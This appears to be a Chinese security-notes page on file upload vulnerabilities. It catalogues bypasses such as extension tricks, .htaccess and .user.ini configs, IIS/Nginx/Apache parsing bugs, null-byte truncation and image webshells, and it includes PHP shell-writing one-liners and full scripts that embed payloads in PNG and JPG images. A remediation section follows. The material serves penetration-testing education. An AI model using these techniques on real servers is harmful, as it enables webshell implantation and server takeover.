---
sidebar_position: 0
sidebar_label: 文件上传
sidebar_class_name: green
---

# **文件上传**



### 漏洞成因

攻击者通过网页中的一些没有做过滤或者过滤不足的文件上传点，通过一些特殊构造方式进行绕过，并将木马或者一些特殊文件通过上传点上传至服务器上，从而获取webshell，导致服务器权限被获取，服务器中内容被泄露；甚至可能导致攻击者利用得到的webshell提升至更高权限的shell，使得服务器被攻击者控制使用。

文件上传漏洞需满足的条件：上传的木马文件所使用的语言在服务器要有环境去运行；上传的文件要有可执行的权限；已知上传后的文件位置和文件名；识别语言类型php/asp/jsp/aspx。



### 绕过方式

##### 前端验证绕过

直接禁用或者删除`js`



##### 后端MIME类型检测绕过

bp抓包后修改请求头上的`Content-Type`值（例：`image/jpeg`）



##### 黑名单（上传内容只要不在黑名单就行）

1.相似扩展名`.php4`、`.php5`、`.phtm`等



2.`apache`的配置文件`.htaccess`，通过上传`.htaccess`将`jpg`后缀文件解析为`php`代码

注：`.htaccess` 默认不支持 `nginx`，设置后支持,默认支持`Apache`，`.htaccess` 可以通过设置实现`nginx`文件解析配置，将`.png` 后缀的文件解析成 `php`。

```shell
#将jpg后缀的文件当做php来执行
AddType application/x-httpd-php .jpg

#将所有名字里含有shell的文件当做php来执行
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatchc>
```



3.后缀大小写绕过（`Php,PHP,pHp`等），在 `PHP` 环境下，服务器默认是不区分文件名大小写的（在 `Windows` 系统下更是如此）



4.空格绕过（`shell.php ` ），在 `Windows` 系统中，保存文件时会自动去除文件名末尾的空格，而黑名单中通常不会包含带空格的后缀



5.加点绕过（`shell.php.`），在 `Windows` 系统下，文件名最后一个点会被自动忽略



6.`::$DATA`绕过，`shell.php::$DATA`，利用`windows`下的`NTFS`文件系统的一个特性；服务器检测时，可能会将`::$DATA`视为非法字符而不进行严格检查，但 `Windows` 系统会正确处理这个文件名，将其保存为`shell.php`，当我们访问`shell.php::$data`就相当于请求`shell.php`；



7.点空点（. .）绕过，`shell.php. .`，适用于黑名单仅过滤一次



8.双写绕过，`shell.phphpp`，适用于黑名单会检测删除`php`后缀



9.解析漏洞利用绕过

`apache`解析漏洞

解析时，如果遇到不认识的后缀会从右往左继续判断，我们可以构造`shell.php.swp.xzh`，`apache`会一直往左解析直到解析到`php`，将文件识别为`php`文件进行执行，但是文件后缀为`xzh`从而绕过黑名单；

`Apache HTTPD` 换行解析漏洞（`CVE-2017-15715`）`apache` 通过 `mod_php` 来运行脚本，其 `2.4.0-2.4.29` 中存在 `apache` 换行解析漏洞，在解析 `php` 时 `xxx.php\x0A` 将被按照 `PHP` 后缀进行解析，导致绕过一些服务器的安全策略



`IIS`解析漏洞

目录解析漏洞(`/test.asp/1.jpg`)

在 `IIS5.x/6.0` 中，在网站下建立文件夹的名字为`*.asp、*.asa、*.cer、*.cdx` 的文件夹，那么其目录内的任何扩展名的文件都会被`IIS`当做`asp`文件来解释并执行。例如创建目录 `test.asp`，那么 `/test.asp/1.jpg` 将被当做`asp`文件来执行。

文件名解析漏洞(`test.asp;.jpg`)

在 `IIS5.x/6.0` 中， 分号后面的不被解析，也就是说 `test.asp;.jpg` 会被服务器看成是`test.asp`。还有`IIS6.0`默认的可执行文件除了`asp`还包含这两种 `.asa  .cer` 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 `.asp;.jpg、.asa;.jpg、.cer;.jpg` 后缀的文件，就可以通过服务器校验，并且服务器会把其当成`asp`文件执行。

畸形解析漏洞(`test.jpg/*.php`)

在 `IIS7.0`中，在默认`Fast-CGI`开启状况下，上传图片马后访问`test.jpg/*.php`会将其当作`php`文件进行执行，我们在图片马中写入如下一句话木马，就能在其目录下创建一个`shell.php`，从而拿到`shell`；但是只要设置 `cgi.fix_pathinfo`为0就不能使用这个漏洞

```php
<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>'); ?>
```



`Nginx`解析漏洞

畸形解析漏洞(`test.jpg/*.php`)

与上面`IIS`同理，`Nginx`也可以使用这个漏洞，上传图片马后访问`test.jpg/*.php`会将其当作`php`文件进行执行，我们在图片马中写入如下一句话木马，就能在其目录下创建一个`shell.php`，从而拿到`shell`；因为`cgi.fix_pathinfo`是php中的参数，默认是开启为1的状态；但在高版本的`php`中，由于`security.limit_extensions` 的引入，使得该漏洞难以被成功利用，低版本`php`中只要设置 `cgi.fix_pathinfo`为0就不能使用这个漏洞

```php
<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>'); ?>
```

%00空字节代码解析漏洞

`Ngnix`在遇到`%00`空字节时与后端`FastCGI`处理不一致，导致可以在图片中嵌入`PHP`代码然后通过访问`xxx.jpg%00.php`来执行其中的代码

在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问 xxx.jpg%00.php 来执行其中的代码

```
 Nginx 0.5.*

 Nginx 0.6.*

 Nginx 0.7 <= 0.7.65

 Nginx 0.8 <= 0.8.37
```

CVE-2013-4547(%20%00)

影响nginx版本：nginx 0.8.41 ~ 1.5.6

非法字符空格（%20）和截止符（%00）会导致`Nginx`解析`URL`时的有限状态机混乱，允许攻击者通过一个非编码空格绕过后缀名限制。

```
http://x.x.x.x/test.jpgAAAphp 
将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码）
```



##### 白名单（相较比黑名单难绕，只允许规定在白名单的内容才能上传）

1.%00截断

攻击者上传文件 `shell.php%00.jpg`，服务器在处理文件名时，可能会将文件名截断为 `shell.php`，因为它在 `%00` 字符处停止读取字符串，如果服务器只检查文件名的扩展名部分（即 `.jpg`），它可能会认为这是一个合法的图片文件，并将其保存到服务器上，由于文件名被截断，实际上保存的文件是 `shell.php`，这是一个`PHP`脚本文件，而不是图片

2.图片马

`edjpgcom.exe`生成或者使用`copy`命令生成

```shell
copy 1.jpg/b+2.php 3.jpg
```

3.数组绕过

在PHP中，如果程序不严格验证用户输入，攻击者可能会通过提供非预期的数组结构来绕过安全限制。在该PHP代码示例中，存在一个安全漏洞，因为它直接使用了用户通过GET请求提供的`save_name`参数，而没有进行适当的验证

```php
<?php
$file =$_GET['save_name'];
echo $file_name = reset($file) . '.' . $file[count($file) - 1];
?>
```

`reset($file)`函数返回数组的第一个元素，`$file[count($file) - 1]`尝试获取数组的最后一个元素

如果攻击者控制了`$file`数组，他们可以通过以下方式绕过文件类型检查：

攻击者可以发送一个数组，其第一个元素是期望的文件名，最后一个元素是`.php`（或其他可执行文件扩展名），由于Windows系统会自动删除文件名末尾的`.`，攻击者可以利用这一点来绕过文件扩展名的限制

假设攻击者发送以下GET请求：

```bash
http://example.com/upload.php?save_name[0]=shell&save_name[2]=php
```

最终文件为`shell.php`



##### 条件竞争

条件竞争漏洞，发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。服务器对上传文件的操作大多数都是单线程处理，当我们执行多个线程时可以绕过一些服务器端的防御。 这里使用了unlink函数来删除不符合的文件，但代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问就能够成功执行

```php
<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>'); ?>
```



##### 文件头绕过（检测文件头）

```bash
JPEG (JPG) 文件
文件头: FF D8 FF
PNG 文件
文件头: 89 50 4E 47 0D 0A 1A 0A
GIF 文件
文件头: 47 49 46 38 (GIF89a) 或者 47 49 46 38 37 61 (GIF87a)
PDF 文件
文件头: %PDF-
ZIP 文件
文件头: 50 4B 03 04 (压缩的ZIP文件) 或者 50 4B 05 06 (未压缩的ZIP文件)
Microsoft Office 文件
Word文档 (.doc): D0 CF 11 E0 A1 B1 1A E1
Word文档 (.docx): 50 4B 03 04 14 00 06 00
Excel电子表格 (.xls): D0 CF 11 E0 A1 B1 1A E1
Excel电子表格 (.xlsx): 50 4B 03 04 14 00 06 00
PowerPoint演示文稿 (.ppt): D0 CF 11 E0 A1 B1 1A E1
PowerPoint演示文稿 (.pptx): 50 4B 03 04 14 00 06 00
TIFF 文件
文件头: 49 49 2A 00 (小端) 或者 4D 4D 00 2A (大端)
MP3 文件
文件头: 49 44 33 后面通常跟着 2E 00 或者其他标识版本和层的信息
AVI 文件
文件头: 52 49 46 46 (RIFF) 紧接着是 41 56 49 20 (AVI )
BMP 文件
文件头: 42 4D
```

在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。

```php
GIF89a

<?php phpinfo();?>
```



##### .user.ini文件

`.user.ini`中两个中的配置`auto_prepend_file`和`auto_append_file`。这两个配置的意思就是：我们指定一个文件（如`1.jpg`），那么该文件就会被包含在要执行的`php`文件中（如`index.php`），相当于在`index.php`中插入一句：`require(./1.jpg)`。这两个设置的区别只是在于`auto_prepend_file`是在文件前插入，`auto_append_file`在文件最后插入。

利用`.user.ini`的前提是服务器开启了`CGI`或者`FastCGI`，并且上传文件的存储路径下有`index.php`可执行文件，`php`版本必须要在5以上

该`.user.ini`文件意思是无论访问当前目录下哪个 `php` 文件都会自动去包含 `1.jpg` 这个文件，得我们上传的图片格式的`webshell`也能够被解析，以此成功利用漏洞拿到`shell`权限

```ini
auto_prepend_file=1.jpg
auto_append_file=1.jpg
```



##### 二次渲染

一些文件上传点，图片在上传之后，会对其进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，然后再保存，从而导致我们在传图片马时里面的内容被破坏，导致木马程序无法正常执行

```
参考文章：https://xz.aliyun.com/news/2337#toc-3
```

`gif`：先将普通的`gif`图片上传，会被渲染，渲染之后再下载下来，与原`git`图片对比，找到渲染前后没有变化的位置，然后在这些位置插入`php`一句话，再上传即可。

`png`：索引类型图，由多个数据块组成，相对复杂，可以尝试将木马写入 `PLTE` 数据块或写入`IDAT`数据块

写入 `PLTE` 数据块：

`php`底层在对`PLTE`数据块验证的时候,主要进行了`CRC`校验.所以可以在`chunk data`域插入`php`代码,然后重新计算相应的`crc`值并修改即可；这种方式只针对索引彩色图像的`png`图片才有效,在选取`png`图片时可根据`IHDR`数据块的`color type`辨别.`03`为索引彩色图像.

写入`IDAT`数据块：

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

`jpg`：很难成功实现，可尝试使用脚本生成图片上传尝试

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=phpinfo();?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
使用方法：
找一个jpg图片,先上传至服务器然后再下载到本地保存为1.jpg.
插入php代码
使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg
使用16进制编辑器打开,就可以看到插入的php代码.
```



##### 编辑器漏洞

```
常用编辑器：
FCKeditor
EWEbeditor
CKFinder
UEDITOR
DotNet TextBox
Cute Editor
```

[编辑器漏洞手册 | 安全备忘单翻译项目](https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/editor-vulnerability-manual.html#fckeditor)

1.`Fckeditor`编辑器

```
常见上传目录：
FCKeditor/editor/filemanager/browser/default/connectors/test.html
FCKeditor/editor/filemanager/upload/test.html
FCKeditor/editor/filemanager/connectors/test.html
FCKeditor/editor/filemanager/connectors/uploadtest.html
```

 “.” 变 “_” 绕过方法
在高版本`fck`中，直接上传或抓包修改文件名`“shell.asp;.jpg”`，都会将前面的点变成下划线，也就是变成`“a_asp;.jpg”`。需要创建`1.asp`文件夹，然后在`1.asp`文件夹下上传图片马即可解析为`asp`文件。类似于前文的`iis`解析漏洞。

2.`eWebEditor`编辑器

1）后台（弱口令或者未授权）

`eWeb`编辑器需要登录后台，其默认数据库地址是：`ewebeditor/db/ewebeditor.mdb`
2）`eweb`遍历漏洞

利用该漏洞遍历文件目录、查看整个网站结构及敏感信息

`ewebeditor/admin_uploadfile.asp?id=14&dir=./`

3）修改样式
在图片类型中添加`.asa`后缀，编辑器会解析为`asp`文件
打开“工具栏”点击按钮设置，添加插入图片的按钮，保存，上传`asa`文件即可。

3.`Ueditor`编辑器

访问`http://ip:port/net/controller.ashx` 控制器文件。

```json
返回该内容表示漏洞存在：{"state":"action 参数为空或者 action 不被支持。"}
```

其余可直接上网查利用方式



##### 利用 windows 环境的叠加特征绕过

在Windows操作系统中，文件系统有一定的规则来处理文件名。当一个文件以特定的方式命名时，比如 `phpinfo.php:.jpg`，Windows可能会截断或忽略文件名中某些特殊字符后面的部分。这是因为 `:` 在Windows中是一个用于表示卷标或驱动器的特殊字符，而在文件名中通常不被允许。当你尝试上传一个名为 `phpinfo.php:.jpg` 的文件时，Windows可能会将文件名截断为 `phpinfo.php`，因为 `:` 后面的部分被视为对文件系统的指令，而不是文件名的一部分。这样，就会在目录下创建一个名为 `phpinfo.php` 的空白文件

Windows的文件系统中，以下符号在正则匹配时可能被视为相等：

- 双引号 `"` 等于 点号 `.`
- 大于符号 `>` 等于 问号 `?`
- 小于符号 `<` 等于 星号 `*`

`文件名.<`、`文件名.<<<`、`文件名.>>>` 或 `文件名.>><空文件名` 时，这些是在尝试利用Windows文件系统的特性来创建特殊的文件名，这些文件名会在文件系统中被解释为不同的东西，或者导致文件名的一部分被忽略



### 漏洞修复

1.对文件上传类型进行验证，除了在前端验证外，在后端也要进行验证，在后端可以进行扩展名验证（设置白名单）、MIME类型检测；

2.重命名上传后的文件，或者直接uuid生成文件名，限制文件上传的大小，将上传的文件放在其他文件存储服务器中

3.严格限制和校验上传的文件内容，禁止上传存在恶意代码的文件，限制上传文件目录的执行权限，防止木马文件被执行

4.对上传文化格式进行校验，防止上传恶意脚本文件

5.严格限制上传文件的保存路径，隐藏上传文件路径不做回显

6.修复中间件漏洞，对其进行安全配置，或者使用版本相对较高的中间件，合理避开存在解析漏洞的版本



### webshell管理工具

冰蝎（Behinder）、哥斯拉、蚁剑、中国菜刀



### 参考文章

[文件上传利用总结 - yokan - 博客园](https://www.cnblogs.com/yokan/p/15252077.html)

